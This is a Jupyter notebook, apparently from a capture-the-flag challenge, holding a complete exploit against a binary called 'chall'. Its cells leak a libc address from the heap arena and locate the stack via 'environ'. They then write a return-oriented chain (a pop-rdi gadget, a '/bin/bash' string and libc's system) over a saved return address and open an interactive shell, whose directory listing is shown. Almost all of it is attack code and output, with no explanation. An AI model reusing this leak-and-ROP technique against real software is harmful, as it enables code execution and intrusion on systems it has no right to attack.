{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-12-09T22:25:53.293005Z",
     "start_time": "2018-12-09T22:25:47.829261Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "94733611752880 (0, 529, 94733611751712, 139648518867712, 0, 0, 0, 0, 0, 0)\n",
      "\n"
     ]
    }
   ],
   "source": [
    "cur = c1\n",
    "while cur.addr != 0:\n",
    "  print(cur.addr, pwn.mem.read_nu64(cur.addr -16, 10))\n",
    "  if input().find('1') == -1: break\n",
    "  #cur.addr+=(cur.size&~1)\n",
    "  cur = cur.prev_free\n",
    "  print()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-12-09T22:05:45.763237Z",
     "start_time": "2018-12-09T22:05:45.745829Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x7f7cb9a30aa0\n"
     ]
    }
   ],
   "source": [
    "print(hex(arena_addr))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-12-09T22:26:01.242319Z",
     "start_time": "2018-12-09T22:25:55.441069Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SETTING m32 False\n",
      "SETTING m32 True\n",
      "SETTING m32 None\n"
     ]
    }
   ],
   "source": [
    "import chdrft.emu.bin_analysis as bin_analysis\n",
    "import chdrft.utils.misc as cmisc\n",
    "\n",
    "import imp\n",
    "from chdrft.emu.elf import ElfUtils\n",
    "import chdrft.emu.elf as celf\n",
    "\n",
    "celf = imp.reload(celf)\n",
    "binary = './chall'\n",
    "elf = celf.ElfUtils(binary)\n",
    "\n",
    "libc = celf.ElfUtils('/lib/libc.so.6')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-12-09T22:26:01.841934Z",
     "start_time": "2018-12-09T22:26:01.834470Z"
    }
   },
   "outputs": [],
   "source": [
    "libc.offset = arena_addr - libc.get_symbol('main_arena')\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-12-09T22:26:07.347907Z",
     "start_time": "2018-12-09T22:26:03.197393Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000: 00005628e1cb612a 00007ffdcf1a6848 000000000000001c 0000000000000001  *a..(V..Hh......................\n",
      "00000020: 00007ffdcf1a7328 0000000000000000 00007ffdcf1a7330 00007ffdcf1a7912  (s..............0s.......y......\n",
      "00000040: 00007ffdcf1a7968 00007ffdcf1a797b 00007ffdcf1a7999 00007ffdcf1a79ce  hy......{y.......y.......y......\n",
      "00000060: 00007ffdcf1a79df 00007ffdcf1a7a0c 00007ffdcf1a7a17 00007ffdcf1a7a33  .y.......z.......z......3z......\n",
      "00000080: 00007ffdcf1a7a56 00007ffdcf1a7a62 00007ffdcf1a7a91 00007ffdcf1a7ab7  Vz......bz.......z.......z......\n",
      "000000a0: 00007ffdcf1a7ac2 00007ffdcf1a7ade 00007ffdcf1a7afd 00007ffdcf1a7b0c  .z.......z.......z.......{......\n",
      "000000c0: 00007ffdcf1a7b32 00007ffdcf1a7b6c 00007ffdcf1a7b95 00007ffdcf1a7ba4  2{......l{.......{.......{......\n",
      "000000e0: 00007ffdcf1a7baf 00007ffdcf1a7bdd 00007ffdcf1a7c00 00007ffdcf1a7c1b  .{.......{.......|.......|......\n",
      "00000100:  \n",
      "\n"
     ]
    }
   ],
   "source": [
    "environ_stack = pwn.mem.read_ptr(libc.get_symbol('environ'))\n",
    "print(pwn.mem.xxd(environ_stack-0x30, 0x100))\n",
    "\n",
    "def find_stack_top_from_environ(pwn, environ_stack_addr):\n",
    "  import itertools\n",
    "  cur = environ_stack_addr - 8 -8\n",
    "  for argc in itertools.count():\n",
    "    if pwn.mem.read_ptr(cur) == argc:\n",
    "      break\n",
    "    cur -= 8\n",
    "  return cur\n",
    "    \n",
    "first_call_rsp = find_stack_top_from_environ(pwn, environ_stack) - 2*8 # two pushes before first call\n",
    "chall_first_ret = pwn.mem.read_ptr(first_call_rsp - 8)\n",
    "\n",
    "elf.offset = chall_first_ret - (elf.get_symbol('_start') + 0x2a)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-12-09T22:26:08.480128Z",
     "start_time": "2018-12-09T22:26:08.109735Z"
    }
   },
   "outputs": [],
   "source": [
    "assert elf.get_range(elf.get_entry_address(), n=0x20) == pwn.mem.read(elf.get_entry_address(), 0x20)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-12-09T22:26:11.713230Z",
     "start_time": "2018-12-09T22:26:11.561118Z"
    }
   },
   "outputs": [],
   "source": [
    "data = bin_analysis.r2_extract_all(binary, elf.offset)\n",
    "bh = bin_analysis.BinHelper(binary, data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-12-09T22:26:27.754882Z",
     "start_time": "2018-12-09T22:26:22.127724Z"
    }
   },
   "outputs": [],
   "source": [
    "menu_ret = cmisc.get_uniq(data.f['sym.menu'].codexrefs_funcs['main']).addr  + 5\n",
    "rsp_target = first_call_rsp - 8\n",
    "\n",
    "import itertools\n",
    "for i in itertools.count():\n",
    "  rsp_target -= 8\n",
    "  if pwn.mem.read_ptr(rsp_target) == menu_ret:\n",
    "    break\n",
    "ret_addr = rsp_target\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-12-09T22:26:31.058371Z",
     "start_time": "2018-12-09T22:26:31.023361Z"
    }
   },
   "outputs": [],
   "source": [
    "from chdrft.emu.base import Stack\n",
    "stack = Stack(None, pwn.mem, pwn.mem.arch, fixed_sp = ret_addr)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-12-09T22:26:39.658374Z",
     "start_time": "2018-12-09T22:26:39.643077Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SYSTEMLIBC >>  0x7f027444b380\n",
      "SP >>  0x7ffdcf1a6758\n"
     ]
    }
   ],
   "source": [
    "system_addr = libc.get_dyn_symbol('system')\n",
    "sx = b'/bin/bash\\x00'\n",
    "set_sp_gadget = 0x00000000000019cd\n",
    "rdi_gadget= 0x19d3 + elf.offset\n",
    "buf_addr = stack.sp + 0x40\n",
    "print('SYSTEMLIBC >> ', hex(system_addr))\n",
    "print('SP >> ', hex(stack.sp))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-12-09T22:26:41.173063Z",
     "start_time": "2018-12-09T22:26:40.888208Z"
    }
   },
   "outputs": [],
   "source": [
    "stack.set(0, rdi_gadget)\n",
    "stack.set(1, buf_addr)\n",
    "stack.set(2, system_addr)\n",
    "\n",
    "pwn.mem.write(buf_addr, sx)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-12-09T22:26:42.084034Z",
     "start_time": "2018-12-09T22:26:42.065101Z"
    }
   },
   "outputs": [],
   "source": [
    "c.quit()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-12-09T22:26:48.703403Z",
     "start_time": "2018-12-09T22:26:42.734722Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Starting interactive mode >> \n",
      " >> ls\n",
      "a.out\n",
      "chall\n",
      "chdrft.cache\n",
      "chdrft.cache.bak\n",
      "control.tar.gz\n",
      "core.19415\n",
      "core.19508\n",
      "core.19513\n",
      "core.24296\n",
      "core.25439\n",
      "core.25442\n",
      "core.27908\n",
      "core.28854\n",
      "core.29758\n",
      "core.29762\n",
      "core.30185\n",
      "core.30349\n",
      "core.3520\n",
      "core.6104\n",
      "core.6672\n",
      "core.6742\n",
      "core.6765\n",
      "core.6772\n",
      "core.6856\n",
      "core.6862\n",
      "core.7061\n",
      "core.7179\n",
      "core.7273\n",
      "core.7442\n",
      "core.7611\n",
      "core.8682\n",
      "core.8688\n",
      "data.tar.xz\n",
      "debian-binary\n",
      "dump.mem\n",
      "dump.out\n",
      "etc\n",
      "kernel_jup.py\n",
      "lib\n",
      "lib64\n",
      "libc.so.6\n",
      "main.py\n",
      "__pycache__\n",
      "test.c\n",
      "Untitled16.html\n",
      "Untitled16.ipynb\n",
      "Untitled16.py\n",
      "usr\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[0;32m/usr/lib/python3.7/site-packages/ipykernel/kernelbase.py\u001b[0m in \u001b[0;36m_input_request\u001b[0;34m(self, prompt, ident, parent, password)\u001b[0m\n\u001b[1;32m    728\u001b[0m             \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 729\u001b[0;31m                 \u001b[0mident\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mreply\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msession\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrecv\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstdin_socket\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m0\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    730\u001b[0m             \u001b[0;32mexcept\u001b[0m \u001b[0mException\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/lib/python3.7/site-packages/jupyter_client/session.py\u001b[0m in \u001b[0;36mrecv\u001b[0;34m(self, socket, mode, content, copy)\u001b[0m\n\u001b[1;32m    802\u001b[0m         \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 803\u001b[0;31m             \u001b[0mmsg_list\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0msocket\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrecv_multipart\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mmode\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcopy\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mcopy\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    804\u001b[0m         \u001b[0;32mexcept\u001b[0m \u001b[0mzmq\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mZMQError\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0me\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/lib/python3.7/site-packages/zmq/sugar/socket.py\u001b[0m in \u001b[0;36mrecv_multipart\u001b[0;34m(self, flags, copy, track)\u001b[0m\n\u001b[1;32m    466\u001b[0m         \"\"\"\n\u001b[0;32m--> 467\u001b[0;31m         \u001b[0mparts\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m[\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrecv\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mflags\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcopy\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mcopy\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtrack\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mtrack\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    468\u001b[0m         \u001b[0;31m# have first part already, only loop while more to receive\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32mzmq/backend/cython/socket.pyx\u001b[0m in \u001b[0;36mzmq.backend.cython.socket.Socket.recv\u001b[0;34m()\u001b[0m\n",
      "\u001b[0;32mzmq/backend/cython/socket.pyx\u001b[0m in \u001b[0;36mzmq.backend.cython.socket.Socket.recv\u001b[0;34m()\u001b[0m\n",
      "\u001b[0;32mzmq/backend/cython/socket.pyx\u001b[0m in \u001b[0;36mzmq.backend.cython.socket._recv_copy\u001b[0;34m()\u001b[0m\n",
      "\u001b[0;32m/usr/lib/python3.7/site-packages/zmq/backend/cython/checkrc.pxd\u001b[0m in \u001b[0;36mzmq.backend.cython.checkrc._check_rc\u001b[0;34m()\u001b[0m\n",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: ",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-14-50084f6eaed2>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mc\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mconn\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0minteractive\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m~/programmation/chdrft/tube/tube.py\u001b[0m in \u001b[0;36minteractive\u001b[0;34m(self, use_input, full_print)\u001b[0m\n\u001b[1;32m    246\u001b[0m       \u001b[0;32mwhile\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    247\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0muse_input\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 248\u001b[0;31m           \u001b[0md\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0minput\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'>> '\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0;34m'\\n'\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    249\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    250\u001b[0m           \u001b[0md\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstdin\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mread\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/lib/python3.7/site-packages/ipykernel/kernelbase.py\u001b[0m in \u001b[0;36mraw_input\u001b[0;34m(self, prompt)\u001b[0m\n\u001b[1;32m    702\u001b[0m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_parent_ident\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    703\u001b[0m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_parent_header\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 704\u001b[0;31m             \u001b[0mpassword\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;32mFalse\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    705\u001b[0m         )\n\u001b[1;32m    706\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/lib/python3.7/site-packages/ipykernel/kernelbase.py\u001b[0m in \u001b[0;36m_input_request\u001b[0;34m(self, prompt, ident, parent, password)\u001b[0m\n\u001b[1;32m    732\u001b[0m             \u001b[0;32mexcept\u001b[0m \u001b[0mKeyboardInterrupt\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    733\u001b[0m                 \u001b[0;31m# re-raise KeyboardInterrupt, to truncate traceback\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 734\u001b[0;31m                 \u001b[0;32mraise\u001b[0m \u001b[0mKeyboardInterrupt\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    735\u001b[0m             \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    736\u001b[0m                 \u001b[0;32mbreak\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "c.conn.interactive()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
